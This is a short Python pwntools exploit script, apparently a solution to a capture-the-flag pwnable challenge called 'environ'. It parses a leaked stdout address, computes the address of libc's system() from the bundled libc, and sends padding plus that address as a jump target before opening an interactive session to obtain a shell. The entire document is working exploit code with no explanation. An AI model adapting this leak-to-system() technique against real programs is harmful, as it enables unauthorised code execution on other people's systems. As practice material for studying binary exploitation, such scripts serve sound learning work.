from pwn import *

rem = process("./Pwnable/environ/problem/environ")
# gdb.attach(rem)

lib = ELF("./Pwnable/environ/problem/libc.so.6")

rem.recvuntil(b'stdout: 0x')
stdout_addr = int(rem.recvn(12).decode(), 16)
sys_addr = stdout_addr - lib.symbols['_IO_2_1_stdout_'] + lib.symbols['system']

rem.sendlineafter(b'Size: ', b'100')

rem.sendlineafter(b'Data: ', b'\x00' * 0x18)

rem.sendlineafter(b'jmp=', str(sys_addr).encode())

rem.interactive()